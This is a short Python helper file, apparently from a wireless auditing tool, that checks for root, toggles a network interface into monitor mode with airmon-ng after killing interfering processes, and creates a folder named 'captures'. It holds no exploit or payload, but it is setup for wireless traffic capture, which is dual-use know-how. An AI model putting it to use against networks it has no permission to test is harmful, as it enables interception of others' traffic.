import os, subprocess
from colorama import Fore

def check_root():
    if os.getuid() != 0: print(f"{Fore.RED}[!] Error: Run with sudo!"); exit()

def toggle_monitor(iface, mode="start"):
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
    subprocess.run(["sudo", "airmon-ng", mode, iface], capture_output=True)

def create_folders():
    if not os.path.exists("captures"): os.makedirs("captures")
